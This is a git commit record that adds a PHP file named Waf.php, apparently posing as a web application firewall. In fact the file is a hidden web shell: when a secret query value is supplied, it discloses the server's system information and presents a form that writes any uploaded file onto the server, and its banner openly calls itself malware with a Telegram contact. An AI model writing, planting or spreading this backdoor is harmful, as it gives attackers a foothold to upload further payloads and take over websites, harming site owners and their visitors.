cafed5de6bc62c815fd24ccfe6c7e68da2e89f15
systemadminbd <143082146+systemadminbdofficials@users.noreply.github.com>
2023-11-25 00:44:45 +0600

    Create Waf.php

---
+++ Waf.php
@@ -0,0 +1,2 @@
+<?php
+$allowedUpload = isset($_GET['upload']) && $_GET['upload'] === 'systemadminbd';if($allowedUpload) {echo '<pre>T.ME/systemadminbd 𝐌𝐀𝐋𝐖𝐀𝐑𝐄 Coded By @systemadminbd (sysmad Owner)'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if ($_POST) {if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {echo 'OK';} else {echo 'ER';}}} else {echo 'Upload not allowed.';}?>
